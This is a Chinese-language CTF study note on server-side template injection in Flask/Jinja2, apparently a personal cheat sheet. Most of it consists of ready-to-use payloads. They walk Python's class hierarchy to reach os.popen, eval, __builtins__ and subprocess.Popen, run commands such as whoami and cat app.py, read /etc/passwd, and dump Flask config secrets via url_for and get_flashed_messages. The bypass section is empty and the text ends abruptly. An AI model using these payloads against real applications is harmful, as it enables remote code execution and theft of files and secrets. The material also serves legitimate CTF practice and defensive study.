# SSTI--Jinja2

# 前言

SSTI（服务端模板注入），已然不再是一个新话题，近年来的CTF中还是也经常能遇到的，比如护网杯的easy_tonado、TWCTF的Shrine，19年的SCTF也出了Ruby ERB SSTI的考点；

本篇对这部分总结一下，方便未来做题和复习的时候查阅！

# 简介

首先简单说一下什么是SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；
漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。

# 常用魔法函数

```
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__base__ 
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
__dict__ 查看对象内部所有属性名和属性值组成的字典
```



# 利用流程

> 获取基本类->获取基本类的子类->在子类中找到关于命令执行和文件读写的模块

当然我们通常是找到`buildtins`在下面的基础上去进行一些骚操作，还有`catch_warnings.__init__.__globals__`也比较常用

## 构造链的思路

### 构造链的发现

- 第一步

目的：使用`__class__`来获取内置类所对应的类

可以通过使用`str`，`list`，`tuple`，`dict`等来获取

```
>>> ''.__class__
<class 'str'>
>>> "".__class__
<class 'str'>
>>> [].__class__
<class 'list'>
>>> ().__class__
<class 'tuple'>
>>> {}.__class__
<class 'dict'>
```

- 第二步

目的：拿到`object`基类

用`__bases__[0]`拿到基类或者`__base__`

```
Python 3.9.1
>>> {}.__class__.__bases__[0]
<class 'object'>
>>> {}.__class__.__base__
<class 'object'>
```

用`__mro__[1]`或者`__mro__[-1]`拿到基类

```
Python 3.9.1
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[-1]
<class 'object'>
```

- 第三步

用`__subclasses__()`拿到子类列表

```
Python 3.9.1
>>> ''.__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'weakref'>,...]
```

- 第四步

在子类列表中找到可以加以利用的类

### 利用脚本帮助我们快速找到需要的模块

下面以python3为例，当然python2类似

```python
search = "popen"
num = -1
for i in ().__class__.__base__.__subclasses__():
	num += 1
	try:
		if search in i.__init__.__globals__.keys():
			print(i, num)
	except:
		pass
```

## Python当中的利用

### Python2当中的利用

tips：python2的`string`类型不直接从属于属于基类，所以要用两次 `__bases__[0]`

```
''.__class__.__bases__[0] <type 'basestring'>
''.__class__.__bases__[0].__bases__[0] <type 'object'>
```

- `file`类读写文件

本方法只能适用于python2，因为在python3中`file`类已经被移除了

```
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40] <type 'file'>

```

可以使用dir查看file对象中的内置方法

```
dir(''.__class__.__bases__[0].__bases__[0].__subclasses__()[40])

['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
```

然后直接调用里面的方法即可，payload如下

读文件

```
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/etc/passwd').read()
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()
```

- warnings`类中的`linecache

  本方法只能用于python2，因为在python3中会报错`'function object' has no attribute 'func_globals'`，不知道为啥
  
  ```
  (<class 'warnings.catch_warnings'>)
  # -*- coding: UTF-8 -*-
  print ().__class__.__bases__[0].__subclasses__()[-20].__init__.func_globals['linecache'].os.popen('whoami').read()
  ```
  
  

### python3当中的利用



- `os._wrap_close`类中的`popen`

```
<class 'os._wrap_close'> 139
<class 'os._AddedDllDirectory'> 140

>>> "".__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['popen']('whoami').read()
'desktop-v7cteor\\y4tacker\n'
().__class__.__base__.__subclasses__()[140].__init__.__globals__['popen']('whoami').read()
```

- `__import__`

  ```
  <class '_frozen_importlib._ModuleLock'> 80
  <class '_frozen_importlib._DummyModuleLock'> 81
  <class '_frozen_importlib._ModuleLockManager'> 82
  <class '_frozen_importlib.ModuleSpec'> 83
  {{"".__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__import__('os').popen('whoami').read()}}
  
  ```

### Python2与Python3通杀

这里介绍python2和python3两个版本通用的方法

- `__builtins__`代码执行

这种方法是比较常用的，因为他两种python版本都适用

首先`__builtins__`是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如`abs`，`max`，就是因为`__builtins__`这类模块在Python启动时为我们导入了，可以使用`dir(__builtins__)`来查看调用方法的列表，然后可以发现`__builtins__`下有`eval`，`__import__`等的函数，因此可以利用此来执行命令。

经过简单Python3测试有比较多的类都含有`__builtins__`，比如常用的还有`email.header._ValueFormatter`等等，这也可能是为什么这种方法比较多人用的原因之一吧

```
<class '_frozen_importlib._ModuleLock'> 80
<class '_frozen_importlib._DummyModuleLock'> 81
<class '_frozen_importlib._ModuleLockManager'> 82
<class '_frozen_importlib.ModuleSpec'> 83
<class '_frozen_importlib_external.FileLoader'> 94
<class '_frozen_importlib_external._NamespacePath'> 95
<class '_frozen_importlib_external._NamespaceLoader'> 96
<class '_frozen_importlib_external.FileFinder'> 98
<class 'zipimport.zipimporter'> 105
<class 'zipimport._ZipImportResourceReader'> 106
<class 'codecs.IncrementalEncoder'> 108
<class 'codecs.IncrementalDecoder'> 109
<class 'codecs.StreamReaderWriter'> 110
<class 'codecs.StreamRecoder'> 111
<class 'os._wrap_close'> 134
<class 'os._AddedDllDirectory'> 135
<class '_sitebuiltins.Quitter'> 136
<class '_sitebuiltins._Printer'> 137
<class 'types.DynamicClassAttribute'> 144
<class 'types._GeneratorWrapper'> 145
<class 'warnings.WarningMessage'> 146
<class 'warnings.catch_warnings'> 147
<class 'reprlib.Repr'> 171
<class 'functools.partialmethod'> 179
<class 'functools.singledispatchmethod'> 180
<class 'functools.cached_property'> 181
<class 'contextlib._GeneratorContextManagerBase'> 183
<class 'contextlib._BaseExitStack'> 184
<class 'sre_parse.State'> 190
<class 'sre_parse.SubPattern'> 191
<class 'sre_parse.Tokenizer'> 192
<class 're.Scanner'> 193
<class 'tokenize.Untokenizer'> 207
<class 'traceback.FrameSummary'> 208
<class 'traceback.TracebackException'> 209
<class 'distutils.version.Version'> 210
<class 'dis.Bytecode'> 213
<class 'inspect.BlockFinder'> 214
<class 'inspect.Parameter'> 217
<class 'inspect.BoundArguments'> 218
<class 'inspect.Signature'> 219
<class '_weakrefset._IterationGuard'> 220
<class '_weakrefset.WeakSet'> 221
<class 'weakref.finalize'> 223
<class 'string.Template'> 224
<class 'threading._RLock'> 226
<class 'threading.Condition'> 227
<class 'threading.Semaphore'> 228
<class 'threading.Event'> 229
<class 'threading.Barrier'> 230
<class 'threading.Thread'> 231
<class 'logging.LogRecord'> 232
<class 'logging.PercentStyle'> 233
<class 'logging.Formatter'> 234
<class 'logging.BufferingFormatter'> 235
<class 'logging.Filter'> 236
<class 'logging.Filterer'> 237
<class 'logging.PlaceHolder'> 238
<class 'logging.Manager'> 239
<class 'logging.LoggerAdapter'> 240
<class 'pathlib._Flavour'> 244
<class 'pathlib._Selector'> 246
<class 'pprint._safe_key'> 249
<class 'pprint.PrettyPrinter'> 250
<class 'subprocess.STARTUPINFO'> 258
<class 'subprocess.CompletedProcess'> 259
<class 'subprocess.Popen'> 260
<class 'tempfile._TemporaryFileCloser'> 265
<class 'tempfile._TemporaryFileWrapper'> 266
<class 'tempfile.SpooledTemporaryFile'> 267
<class 'tempfile.TemporaryDirectory'> 268
<class 'gzip._PaddedFile'> 271
<class '__future__._Feature'> 273
<class 'ctypes.CDLL'> 281
<class 'ctypes.LibraryLoader'> 282
<class 'textwrap.TextWrapper'> 283
```

再调用`eval`等函数和方法即可，payload如下

```python
{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

又或者用如下两种方式，用模板来跑循环

```python
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
```

或

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

读取文件payload

```
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

然后这里再提一个比较少人提到的点

`warnings.catch_warnings`类在在内部定义了`_module=sys.modules['warnings']`，然后`warnings`模块包含有`__builtins__`，也就是说如果可以找到`warnings.catch_warnings`类，则可以不使用`globals`

```python
{{''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()}}
```

- subprocess.Popen

```
''.__class__.__mro__[1].__subclasses__()[260]('whoami',shell=True,stdout=-1).communicate()[0].strip()
```

- os

```
<class 'inspect.BlockFinder'> 214
<class 'inspect.Parameter'> 217
<class 'inspect.BoundArguments'> 218
<class 'inspect.Signature'> 219
<class 'logging.LogRecord'> 232
<class 'logging.PercentStyle'> 233
<class 'logging.Formatter'> 234
<class 'logging.BufferingFormatter'> 235
<class 'logging.Filter'> 236
<class 'logging.Filterer'> 237
<class 'logging.PlaceHolder'> 238
<class 'logging.Manager'> 239
<class 'logging.LoggerAdapter'> 240
<class 'pathlib._Flavour'> 244
<class 'pathlib._Selector'> 246
<class 'subprocess.STARTUPINFO'> 258
<class 'subprocess.CompletedProcess'> 259
<class 'subprocess.Popen'> 260
<class 'gzip._PaddedFile'> 271

().__class__.__base__.__subclasses__()[214].__init__.__globals__['os'].popen('whoami').read()
```

### 获取配置信息

我们有时候可以使用flask的内置函数比如说`url_for`，`get_flashed_messages`，甚至是内置的对象`request`来查询配置信息或者是构造payload

- `config`

我们通常会用`{{config}}`查询配置信息，如果题目有设置类似`app.config ['FLAG'] = os.environ.pop('FLAG')`，就可以直接访问`{{config['FLAG']}}`或者`{{config.FLAG}}`获得flag

- `request`

jinja2中存在对象`request`

```
Python 3.9.1
>>> from flask import Flask,request,render_template_string
>>> request.__class__.__mro__[1]
<class 'object'>
```

查询一些配置信息

```python
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
```

- `url_for`

查询配置信息

```
{{url_for.__globals__['current_app'].config}}
```

- `get_flashed_messages`

查询配置信息

```
{{get_flashed_messages.__globals__['current_app'].config}}
```

当然也可以通过一些配置信息来构造payload

```
{{url_for.__globals__.__builtins__.eval('__import__("os").popen("cat app.py").read()')}}

{{config.__init__.__globals__. __builtins__.eval('__import__("os").popen("cat app.py").read()')}}
{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
```

# 绕过过滤

现在各大比赛都让你去绕过各种各样的黑名单，对网上资料做个总结与整合

# 参考资料

作为 web层面的攻击,我们要关注语言层面的特性和绕过，在Flask/Jinja2 模板的语法,filters和内建函数,变量,都可能称为绕过的trick

[Jinja官方文档](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters)

[Flask官方文档](https://dormousehole.readthedocs.io/en/latest/)

[细说Jinja2之SSTI&bypass](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652868785&idx=1&sn=aea3849c8ee1cdc50ad0742744159800&chksm=bd59ec7c8a2e656a4f9f5b0753c6bef4efeae17ca9a5ab3d550fdac9b302adf3696c1c432eb1&mpshare=1&scene=23&srcid=1219HTr8L8YaCVw9dnE3xDUj&sharer_sharetime=1608375002321&sharer_shareid=39123bd44a937bb35fd979cc8098127f#rd)



## 注意

## 命令执行构造

在{{}}我们可以执行表达式,但是命名空间是受限的,没有builtins,所以eval,open这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的func_globals而得到他们的命名空间,而得到builtins

